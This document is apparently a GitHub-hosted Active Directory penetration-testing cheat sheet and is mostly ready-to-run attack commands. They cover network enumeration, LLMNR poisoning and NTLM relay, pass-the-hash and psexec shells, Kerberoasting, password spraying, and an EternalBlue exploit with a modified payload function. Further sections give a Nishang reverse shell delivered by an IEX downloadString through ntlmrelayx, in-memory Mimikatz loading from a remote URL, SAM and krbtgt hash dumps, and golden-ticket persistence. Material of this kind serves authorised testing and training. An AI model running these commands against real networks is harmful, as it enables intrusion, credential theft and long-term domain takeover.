![active-directory-monitoring](https://user-images.githubusercontent.com/84678370/127057641-382b4592-0b78-4883-b5e0-edae43e22556.png)


* ### Author: __Hiou__

* ### Linkedin: __https://www.linkedin.com/in/xl22glckz__
## Summary
- [__Main__](#Main-Enum)
- [__RID__](#RID)
- [__LDAP__](#LDAP)
- [__SMB__](#SMB)
- [__rpcclient__](#rpcclient)
- [__crackmapexec smb__](#crackmapexec-SMB)
- [__crackmapexec mssql__](#crackmapexec-MSSQL)
- [__bloodhound__](#bloodhound)
- [__Kerberos Enum__](#Kerberos-Enum)
- [__Metasploit Enum__](#Metasploit-Enum)
- [__Metasploit Post__](#Metasploit-Post)
- [__Attack__](#Attack)
- [__LLMNR NBT NS__](#LLMNR)
- [__crackmapexec Attack__](#crackmapexec-Attack)
- [__pth-winexe Pass the Hash__](#pth-winexe-Pass-the-Hash)
- [__psexec__](#psexec)
- [__Evil winrm__](#evil-winrm)
- [__Kerberoasting__](#Kerberoasting)
- [__AS-REP Roasting__](#AS-REP-Roasting)
- [__Spraying The Forest__](#Spraying-The-Forest)
- [__Spray__](#Spray)
- [__EternalBlue__](#EternalBlue)
- [__Nishang__](#Nishang)
- [__Powershell__](#Powershell)
- [__Mimikatz__](#Mimikatz)
# Main Enum
````
crackmapexec 10.10.10.0/24

nmap -sn 10.10.10.0/24 > ips.txt

nmap -sn -f --min-rate 2000 -10.10.10.0/24 -oN file

nmap -g port -sn -f --min-rate 1000 10.10.10.0/24 -oN file

fping -g -a 192.168.1.0/24 2>/dev/null > ips.txt

nmap -f -sS -p- --open --min-rate 2000 -iL ips.txt -Pn -v -n -oG file

nmap -g port -f -sS -p- --open --min-rate 1000 -iL ips.txt -Pn -v -n -oG allPorts

nmap -sS -sU -p161 --min-rate 2000 -iL ips.txt -Pn -v -n -oN file

nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='domain.com'"
````
> ### _RID_
````
impacket-lookupsid username:password@pepe.local

cme smb 10.10.10.0/24 -u username -p 'password' --rid-brute

cme smb 10.10.10.x -u username -p 'password' --rid-brute --obfs

cme smb 10.10.10.x -u users.txt -p passwords.txt --rid-brute

cme smb 10.10.10.0/24 -u users.txt -p passwords.txt --rid-brute --obfs

ridenum <ip> <start_rid> <end_rid> <optional_password_file> <optional_username_filename>
````
> ### _LDAP_
````
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP> -oN file

ldapdomaindump -r 10.10.10.x -u pepe.local\\username -p 'password' --authtype SIMPLE --no-json --no-grep

ldapsearch -x -h 10.10.10.x -D '' -w '' -b "DC=pepe.LOCAL"

ldapsearch -x -h 10.10.10.x -D 'pepe.LOCAL\username' -w 'password'

ldapsearch -x -h 10.10.10.x -D 'pepe.local\username' -w 'password' -b "DC=pepe,DC=local"

ldapsearch -x -h 10.10.10.x -D 'pepe.local\username' -w 'password' -b "CN=Users,DC=pepe,DC=local"
````
> ### _SMB_
````
smbmap -H 10.10.10.x -u invaliduser

smbmap -H 10.10.10.x -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password" -d DOMAIN

smbclient -I 10.10.10.x -L ACTIVE -N -U ""

smbclient //10.10.10.x/share -N -c ls

smbclient -I 10.10.10.x -L ACTIVE -U username

enum4linux -a pepe.local

enum4linux -U -v pepe.local

enum4linux -a -u " " -p " " pepe.local

enum4linux -r pepe.local

enum4linux -r -u "username" -p "password" pepe.local

enum4linux -r -u "username" -p "password" pepe.local 2>/dev/null
````
> ### _rpcclient_
````
rpcclient -U "" 10.10.10.x -c "query" -N

rpcclient -U "username" 10.10.10.x -c "query"

./rpcenum -e 'query' -i 10.10.10.x > file # Example: All
````
> ### _crackmapexec SMB_
````
cme smb 10.10.10.x -u '' -p ''

cme smb 10.10.10.x -u '' -p '' --flag

cme smb 10.10.10.x -u username -p password --flag  #Example: --users --obfs

cme smb 10.10.10.x

cme smb target/s -u /path/users.txt -p /path/passwords.txt

cme smb 10.10.10.0/24 -u 'username' -p 'password'
````
> ### _crackmapexec MSSQL_
````
cme mssql target/s -u /path/users.txt -p /path/passwords.txt

cme mssql 10.10.10.x -u username -p 'password' #--local-auth -q 'SELECT <query> FROM <query>;'  #Check comment
````
> ### _bloodhound_
````
bloodhound-python -c all -d pepe.local -u 'username' -p 'password' -ns 10.10.10.x

python3 bloodhound.py -c all -d pepe.local -u 'username' -p 'password' -ns 10.10.10.x
````
> ### _Kerberos Enum_
````
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='PEPE.LOCAL'" -Pn ip -v -n -oN users-nmap-recon

nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='PEPE.LOCAL',userdb=/path/usernames.txt ip
````
> ### _Metasploit Enum_
- - https://www.hackingarticles.in/penetration-testing-windows-server-active-directory-using-metasploit-part-1/
- - https://www.hackingarticles.in/penetration-testing-active-directory-using-metasploit-part-2/
- - https://medium.com/@Shorty420/enumerating-ad-98e0821c4c78
----
* systemctl start postgresql
* msfdb init
* db_status
````
use auxiliary/gather/kerberos_enumusers

use auxiliary/scanner/smb/smb_login

use auxiliary/scanner/smb/smb_lookupsid
````
> ### _Metasploit Post_
````
use post/windows/gather/enum_ad_computers

use post/windows/gather/enum_shares

use post/windows/gather/enum_ad_groups

use post/windows/manage/add_user_domain

use post/windows/manage/delete_user

use post/windows/gather/enum_logged_on_users

use post/windows/gather/credentials/gpp

use post/windows/manage/delete_user

use post/windows/gather/enum_services

use post/windows/gather/enum_termserv
````
# Attack

> ### __LLMNR__

> __Here you will see a summary of how network poisoning works and how to launch the attack. I do this so that you do not launch it without knowing what it is doing, since network poisoning can cause damage such as DDos, production stoppage, etc. Remember that your job is also to solve problems and search for information on your own. It is useless to launch an attack if you do not know how it works, so I recommend that you inform yourself well of all the attacks and tools shown here so that you understand at a low level what you are doing, you can have control and do not cause damage.__

> __Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.__

- ((MITM)) Adversaries can spoof an authoritative source for name resolution in a victim network by responding to LLMNR (UDP 5355) / NBT-NS (UDP 137) traffic as if they knew the identity of the requested host, effectively poisoning the service so that victims communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will be sent to the adversary controlled system.

>> __https://attack.mitre.org/techniques/T1557/001/__

- __Poisoning__

- - __Don't poisoning all network__
- - __responder.conf__
- - __responder__
- - __ntlmrelayx__

>> Don't poisoning all network

- __Modify the responder settings to your liking and when using ntlmrelayx, define targets. Poisoning the entire network could cause a denial of service__


>> responder.conf / Default
````
Servers to start
SQL = On
SMB = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
````
>> responder usage
````
responder -h #Help

responder -I interface -A

responder -I interface -wrf

responder -I interface -rdw

responder -I interface --lm #check help
````

>> responder __NTLM__ / __responder.conf__ / __ntlmrelayx__
````
Servers to start
SQL = On
SMB = Off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
````
````
impacket-ntlmrelayx -tf targets.txt -smb2support

responder -I interface -rdw
````
---
> ### _crackmapexec_ __Attack__
````
cme smb 10.10.10.x -u 'username' -H 'NTLM hash'

cme smb 10.10.10.x -u 'username' -p 'password' -x command

cme smb 10.10.10.x -u 'username' -H 'NTLM hash' --sam

cme smb 10.10.10.x -u 'username' -p 'password' --sam

cme smb 10.10.10.x -u 'username' -p 'password' -M rdp -o ACTION='enable'

cme smb 10.10.10.x -u 'username' -H 'NTLM hash' -M -rdp -o ACTION='enable' --obfs

cme smb 10.10.10.x -u 'username' -H 'NTLM hash' -M -rdp -o ACTION='enable'

cme smb 10.10.10.x -u username -p 'password' --ntds

cme smb 10.10.10.x -u username -p 'password' --ntds vss

cme smb 10.10.10.x -u username -p password --pass-pol
````
> ### _pth-winexe_ __Pass the Hash__
````
pth-winexe -U PEPE.LOCAL/username%HASH_LM:HASH_NTLM //10.10.10.x cmd.exe
````
> ### _psexec_
````
impacket-psexec pepe.local/username:password@10.10.10.x cmd.exe

impacket-psexec 'username:password@10.10.10.x' cmd.exe

python3 psexec.py pepe.local/username:password@10.10.10.x cmd.exe
````
> ### _evil-winrm_
````
evil-winrm -i 10.10.10.x -u username -p 'password'

evil-winrm -i 10.10.10.x -u username -H 'hash NTLM' #-p port
````
> ### _Kerberoasting_
````
impacket-GetUserSPNs -rquest -dc-ip 10.10.10.x blackfield.local/username

./kerbrute userenum --dc ip -d PEPE.local users.txt
````
> ### _AS-REP Roasting_
````
impacket-GetNPUsers -format <format> PEPE.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.x -outputfile hashes.txt #format Example: john

impacket-GetADUsers -all -dc-ip 10.10.10.x PEPE.LOCAL/username
````
> ## _Spraying The Forest_

- __Warning Password Spraying__
* __https://docs.microsoft.com/en-us/security/compass/incident-response-playbook-password-spray__
> __When you decide to do a Spraying Attack, you should keep in mind that the policies lock accounts when you reach a certain number of brute force attempts.__
----
----
> ### _Spray_
* __https://github.com/Greenwolf/Spray__

````
/spray.sh -smb ip users-file creds-file <attempts> <minutes> pepe.local

/spray.sh -smb 10.10.10.x users creds 3 20 pepe.local
````
> ## _EternalBlue_
* __https://www.elladodelmal.com/2020/07/modulo-de-eternalblue-doublepulsar-en.html__
* __https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010__
* __https://support.redborder.com/hc/en-us/articles/360000999778-Use-Case-1-Eternalblue-Attack__
* __https://support.redborder.com/hc/en-us/articles/360000999878-Use-case-2__
* __https://es.wikipedia.org/wiki/EternalBlue__
* __https://www.avast.com/c-eternalblue__
* __https://www.sentinelone.com/blog/eternalblue-nsa-developed-exploit-just-wont-die/__
* __https://research.checkpoint.com/2017/eternalblue-everything-know/__
----
* * __https://github.com/worawit/MS17-010__
* * __https://github.com/3ndG4me/AutoBlue-MS17-010__
* * __Manual-Recon__
* * __zzz Exploit__
* * __AutoBlue__
* * __Metasploit-Recon__
* * __Metasploit-Exploit__
>> _Manual-Recon_
````
nmap --script smb-vuln-ms17-010 -p445 -Pn -v -n 10.10.10.x -oN file-name

nmap --script "vuln" -p445 -Pn -v -n 10.10.10.x -oN file-name

nmap --script "vuln and safe" -p445 -Pn -v -n 10.10.10.x -oN file-name

nmap -g 443 -f -sS --script "vuln and safe" -Pn -p445 -v -n 10.10.10.x -oN file-name

nmap -g 443 -f -sS --min-rate 1000 --script "vuln and safe" -p445 -Pn -v -n 10.10.10.x -oN file-name
````
>> _zzz Exploit_

* __Default_Conf__
````
def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()

	print('creating file c:\\pwned.txt on the target')  <--- This obviously we do not want to do
	tid2 = smbConn.connectTree('C$')
	fid2 = smbConn.createFile(tid2, '/pwned.txt')
	smbConn.closeFile(tid2, fid2)
	smbConn.disconnectTree(tid2)

    #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
    #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt') <---
    # Note: there are many methods to get shell over SMB admin session
    # a simple method to get shell (but easily to be detected by AV) is
    # executing binary generated by "msfvenom -f exe-service ..."
````
* __MOD_Conf__

````
def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()

	#print('creating file c:\\pwned.txt on the target')  <--- Comment this
	#tid2 = smbConn.connectTree('C$')
	#fid2 = smbConn.createFile(tid2, '/pwned.txt')
	#smbConn.closeFile(tid2, fid2)
	#smbConn.disconnectTree(tid2)

    #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
    service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt') <--- Here define what you want to do
    # Note: there are many methods to get shell over SMB admin session
    # a simple method to get shell (but easily to be detected by AV) is
    # executing binary generated by "msfvenom -f exe-service ..."
````
````
python3 checker.py 10.10.10.x

python zzz_exploit.py 10.10.10.x <pipe>
````
>> _AutoBlue_
````
apt-get install rlwrap

cd shellcode

./shell_prep.sh

rlwrap nc -nlvp port

rlwrap nc -nlvp port

python3 eternalblue_exploit7.py 10.10.10.x <shellcode_file>
````
>> _Metasploit-Recon_
````
use auxiliary/scanner/smb/smb_ms17_010
````
>> _Metasploit-Exploit_
````
use exploit/windows/smb/ms17_010_eternalblue
````

> ### __Nishang__

* * Nishang
* * Powershell

> _As Nishang says in his Github repository (a very interesting repository) his scripts are tags as malicious, which makes it very difficult for an antivirus to let them touch the "disk", that is why the "memory injection" method is used for Powershell._

* * __https://github.com/samratashok/nishang__

* * __Nishang With Ntlmrelayx__

>> _responder.conf_

````
[Responder Core]

; Servers to start
SQL = On
SMB = Off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
````
>> _Nishang Shell Conf_

* __Open Powershelltcp.ps1 and at the end, paste this (change ip and port)__

* * Invoke-PowerShellTcp -Reverse -IPAddress ip -Port port

````
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress ip -Port port # <--- Here
````
>> _Python3 Simple Server_
````
python3 -m http.server port
````
>> _Listener_
````
rlwrap nc -nlvp port
````
>> _responder On_
````
responder -I interface -rdw
````
>> _ntlmrelayx Nishang_
````
impacket-ntlmrelayx -tf target-file -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ip:port/PowerShellTcp.ps1')" -smb2support
````
> ### __Powershell__
- __https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1__
- __https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon__

- __https://www.pentesteracademy.com/course?id=21__
- __https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf__
- __https://www.varonis.com/blog/powershell-for-pentesters/__
- __https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/?view=powershell-7.1__
- __https://gist.github.com/HarmJ0y/3328d954607d71362e3c__

* * __Process Architecture__
```
[Environment]::is64bitoperatingSystem

[Environment]::is64bitprocess

powershell.exe [Environment]::is64bitprocess > output.txt

powershell.exe [Environment]::is64bitprocess > /path/to/file.txt
```
* * __Powerview Recon__
> You must first download the PowerView on your machine and then transfer it to the victim machine. Above I have left two links that redirect to the PowerShellMafia github.
```
.\PowerView.ps1
```
```
Get-NetUser

Get-NetUser "pepe"

Get-NetGroup

Get-NetDomain

Get-NetDomain -Domain "Pepe.com"

Get-NetComputer

Get-NetComputer -Unconstrained

Get-NetComputer –OperatingSystem "os"
```
```
Get-DomainSID

Get-DomainPolicy

Get-DomainPolicy -Domain pepe.local -DomainController <DC>

Get-DomainController

Get-DomainDNSZone

Get-DomainDNSrecord
```
```
Invoke-UserHunter -ShowAll

Invoke-UserHunter -Unconstrained -ShowAll
```
```
Get-ADUserResultantPasswordPolicy

Get-ADUserResultantPasswordPolicy -Identity pepe
```
> # __Mimikatz__
- __https://github.com/gentilkiwi/mimikatz/releases__
- __https://github.com/gentilkiwi/mimikatz/wiki__
- __https://www.varonis.com/blog/what-is-mimikatz/__
- __https://adsecurity.org/?page_id=1821__
- __https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn408187(v=ws.11)?redirectedfrom=MSDN__
- __https://docs.microsoft.com/es-es/windows/win32/api/ntsecapi/ne-ntsecapi-kerb_protocol_message_type?redirectedfrom=MSDN__
- __https://attack.mitre.org/software/S0002/__

>  Mimikatz is an open source program used by penetration testers to steal credentials in Windows. Let's say it's a Swiss army knife for windows, very good and recommended.

* * Mimikatz Dumps
> With mimikatz, we can attack critical parts, such as dump NTLM, cleartext-passwords, kerberos tickets, etc... I will leave some links so that you can study more in depth the operation of this tool.

* * NTLM SAM file hashes dump

> First of all, it wouldn't hurt to look at the architecture to know that you are in the right process, to avoid false positives at post-exploitation time.
```
.\mimikatz.exe
```
```
privilege::debug
token::elevate
lsadump::sam
```
![mimikatz](https://user-images.githubusercontent.com/84678370/129926509-8ac2f0b8-1953-4152-a011-102bb268dfed.png)

### __privilege::debug__

- - __https://github.com/gentilkiwi/mimikatz/wiki/module-~-privilege__
- - __https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-privilege?redirectedfrom=MSDN__

> The debug privilege allows someone to debug a process that they wouldn’t otherwise have access to. For example, a process running as a user with the debug privilege enabled on its token can debug a service running as local system.

### __token::elevate__

- - __https://book.hacktricks.xyz/windows/stealing-credentials/credentials-mimikatz#token__
- - __https://docs.microsoft.com/es-es/windows/win32/secauthz/impersonation-tokens__

> Impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box.

### __lsadump::sam__

- - __https://adsecurity.org/?page_id=1821#LSADUMPSAM__
- - __https://docs.microsoft.com/es-es/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection__
- - __https://docs.microsoft.com/es-es/windows-server/security/credentials-protection-and-management/whats-new-in-credential-protection__

> Get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer, great.
---
## __Golden Ticket__
- __https://docs.microsoft.com/es-es/defender-for-identity/domain-dominance-alerts__
- __https://attack.mitre.org/techniques/T1558/001/__
- __https://attack.mitre.org/mitigations/M1026/__
- __https://attack.mitre.org/tactics/TA0006/__
- __https://www.qomplx.com/qomplx-knowledge-golden-ticket-attacks-explained/__
- __https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/__
- __https://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos__

> Adversaries who have the KRBTGT account password hash can forge Kerberos ticket-granting tickets (TGTs), also known as golden tickets. Golden tickets allow adversaries to generate authentication material for any Active Directory account. Ultimately, it can be used for the persistence phase in the forest, large, for example, to impersonate the Domain Administrator for 10 years or the specified period.

> The first thing to do is to get the hashes of the krbtgt account.

- __https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1__

> To execute this attack, we have to be in the domain as a domain administrator user.

> The next way to load it into memory is if we have internet access, otherwise we would have to load it in another way.
* * In-Memory
```
IEX ([System.Text.Encoding]::UTF8.GetString((New-Object system.net.WebClient).DownloadData("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")))
```

* * In-Memory Another way
```
python3 -m http.server
```

```
IEX(New-Object system.Net.WebClient).downloadString('http://ip:port/Invoke-Mimikatz.ps1')
```

* * Dump
```
Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'
```

* * Gold-Ticket
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:pepe.local /sid:S-1-5... /rc4:<NTLM> /user:Administrator /ticket:gold.kirbi"'
```
* * Pesistence-Gold.kirbi

![image](https://user-images.githubusercontent.com/84678370/129996058-d9aa82e5-6ecb-4e27-9be3-3711fdb8eb3e.png)

> It is clear that we cannot list the DC files. It would be bad enough if we could without any permissions. This is where our precious mimikatz & gold.kirbi comes in.

```
mimikatz.exe
```

```
kerberos::ptt gold.kirbi

exit
```
![image](https://user-images.githubusercontent.com/84678370/129995781-d88fad4c-f0ec-4457-bbc6-3abb0c7543ca.png)

### __Persistence-Ticketer__

- __https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py__

> This script will create TGT/TGS tickets from scratch or based on a template (legally requested from the KDC)
allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the groups, extrasids, etc. Tickets duration is fixed to 10 years from now (although you can manually change it)

```
impacket-ticketer -nthash <ntlm> -domain-sid S-1-5-2... -domain pepe.local Administrador
```
> On our machine (I say this just in case) we have to specify to an environment variable (KRB5CCNAME) the absolute path where Ticketer has saved the Administrator.ccache file.

```
export KRB5CCNAME="/path/to/file.ccache"
```

> The surprising thing after this, is that no matter how much the Administrator user changes the password, it is not going to do him any good, since we can even do persistence with psexec without providing the password.

```
impacket-psexec -k -n pepe.local/Administrator@DC-NAME cmd.exe
```
![Ticketer](https://user-images.githubusercontent.com/84678370/129994100-20be12cd-b95d-4c97-8a2c-8e528a7a55df.png)

#### Add DC-NAME to your etc/hosts
---
